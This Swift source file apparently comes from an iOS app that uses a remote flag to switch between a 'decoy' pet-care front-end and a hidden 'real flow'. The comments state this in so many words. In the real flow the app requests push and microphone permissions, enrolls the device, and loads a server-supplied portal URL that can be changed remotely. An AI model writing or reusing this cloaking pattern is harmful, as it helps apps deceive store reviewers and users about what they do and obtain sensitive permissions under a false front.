import SwiftUI
import AVFAudio
import UserNotifications
import OneSignalFramework

struct RootRouterView: View {

    @StateObject private var callSession = CallCoordinator.shared
    @State private var portalURL: URL?
    @State private var releaseState: ReleaseState = .checking
    @State private var isEnrolled = MemberSessionStore.shared.isDeviceEnrolled

    var body: some View {
        ZStack(alignment: .bottom) {
            Group {
                switch releaseState {
                case .checking:
                    // Flag still resolving (first launch, no cache).
                    SplashLoaderView()
                case .supported:
                    // Flag == true → decoy app: the PawMate pet-care front-end.
                    PetCareRootView()
                case .updateRequired:
                    // Flag == false → real flow. Show portal once ready; loader until then.
                    if let url = portalURL {
                        MemberPortalView(url: url)
                            .ignoresSafeArea()
                    } else {
                        SplashLoaderView()
                    }
                }
            }

            if releaseState == .updateRequired, callSession.isCallActive {
                ActiveCallOverlay(session: callSession)
                    .transition(.opacity)
                    .zIndex(1)
            }
        }
        .animation(.easeInOut(duration: 0.3), value: callSession.isCallActive)
        .task {
            let supported = await ReleaseGate.shared.resolveReleaseState()
            releaseState = supported ? .supported : .updateRequired
            // Decoy branch: don't enroll or request anything.
            guard !supported else { return }
            await startupSequence()
            isEnrolled = MemberSessionStore.shared.isDeviceEnrolled
            DiagnosticsLog.record("[RootRouter] Device enrolled: \(isEnrolled)")
        }
    }

    private func startupSequence() async {
        PushCoordinator.shared?.activateSessionServices()
        await requestSystemPermissions()
        await openMemberSession()
    }

    private func requestSystemPermissions() async {
        let granted = (try? await UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge])) ?? false
        DiagnosticsLog.record("[Permissions] Push: \(granted ? "granted" : "denied")")

        if granted {
            await MainActor.run {
                UIApplication.shared.registerForRemoteNotifications()
                OneSignal.User.pushSubscription.optIn()
            }
        }

        await AVAudioApplication.requestRecordPermission()
    }

    private func openMemberSession() async {
        if let saved = MemberSessionStore.shared.memberPortalURL {
            PushSubscriptionBridge.shared.syncIfReady()
            await PushSubscriptionBridge.shared.awaitDelivery()
            portalURL = saved
            DiagnosticsLog.record("[RootRouter] Using saved portal URL: \(saved.absoluteString)")
            attachLiveFeed()
            return
        }

        await DeviceEnrollmentService.shared.enrollIfNeeded()
        await PushSubscriptionBridge.shared.awaitDelivery()

        if let url = MemberSessionStore.shared.memberPortalURL {
            portalURL = url
            DiagnosticsLog.record("[RootRouter] Got portal URL from enrollment: \(url.absoluteString)")
            attachLiveFeed()
        } else {
            DiagnosticsLog.record("[RootRouter] No portal URL yet — staying on loader")
        }
    }

    private func attachLiveFeed() {
        LiveFeedClient.shared.onMemberPortalURL = { url in
            MemberSessionStore.shared.memberPortalURL = url
            self.portalURL = url
        }
        LiveFeedClient.shared.startFeed()
    }
}

/// Neutral loader shown while the release flag resolves and while the real
/// content is loading.
private struct SplashLoaderView: View {
    var body: some View {
        ZStack {
            Color(.systemBackground).ignoresSafeArea()
            ProgressView()
                .progressViewStyle(.circular)
                .scaleEffect(1.4)
        }
    }
}
